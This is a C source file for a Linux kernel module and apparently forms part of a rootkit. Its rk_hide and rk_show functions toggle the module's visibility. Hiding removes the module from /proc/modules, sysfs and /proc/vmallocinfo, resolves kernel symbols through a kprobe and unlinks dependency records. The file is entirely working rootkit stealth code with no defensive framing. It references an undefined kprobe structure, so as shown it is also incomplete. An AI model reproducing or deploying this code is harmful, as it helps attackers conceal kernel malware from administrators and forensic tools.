#include <linux/module.h>
#include <linux/kernel.h>	
#include <linux/list.h>		
#include <linux/slab.h>	
#include <linux/types.h>
#include <linux/mutex.h>

static struct list_head *prev_module_in_lsmod;

int mod_hidden = 0, first = 1;

// Name of current Module Kobject
const char *name;
struct kobject mod_kobj;
struct kobject *parent;


static void rk_hide(void) {
	mod_hidden = 1;
	struct vmap_area *va, *vtmp;
	struct module_use *use, *tmp;
	struct list_head *_vmap_area_list;
	struct rb_root *_vmap_area_root;

	#ifdef KPROBE_LOOKUP
		unsigned long (*kallsyms_lookup_name)(const char *name);
		if (register_kprobe(&kp) < 0)
			return;
		kallsyms_lookup_name = (unsigned long (*)(const char *name)) kp.addr;
		unregister_kprobe(&kp);
	#endif

	prev_module_in_lsmod = THIS_MODULE->list.prev;

	/// hidden from /proc/modules
	list_del_init(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	// hidden from /sys/modules, destruct when try rmmod or lsmod no need since we will hide directories
	mod_kobj = (((struct module *)(THIS_MODULE))->mkobj).kobj;	
	name = mod_kobj.name;
	parent = mod_kobj.parent;
	kobject_del(&THIS_MODULE->mkobj.kobj);

	if(first == 1) {
		// hidden from /proc/vmallocinfo
		_vmap_area_list = (struct list_head *) kallsyms_lookup_name("vmap_area_list");
		_vmap_area_root = (struct rb_root *) kallsyms_lookup_name("vmap_area_root");
		list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
			if ((unsigned long) THIS_MODULE > va->va_start && (unsigned long) THIS_MODULE < va->va_end) {
				list_del(&va->list);
				//remove from red-black tree
				rb_erase(&va->rb_node, _vmap_area_root);
			}
		}
			//decouple the dependency
		list_for_each_entry_safe (use, tmp, &THIS_MODULE->target_list, target_list) {
			list_del(&use->source_list);
			list_del(&use->target_list);
			sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
			kfree(use);
		}
		first = 2;
	}
}


static void rk_show(void) {
	kobject_create_and_add(name, parent);
	list_add(&THIS_MODULE->list, prev_module_in_lsmod);

	mod_hidden = 0;
}


void hide_module(void)
{
	printk(KERN_DEBUG "SHOWWWWWW %d HETE bytes\n", mod_hidden);
    if (mod_hidden == 0)
        rk_hide();
    else if (mod_hidden == 1)
        rk_show();
}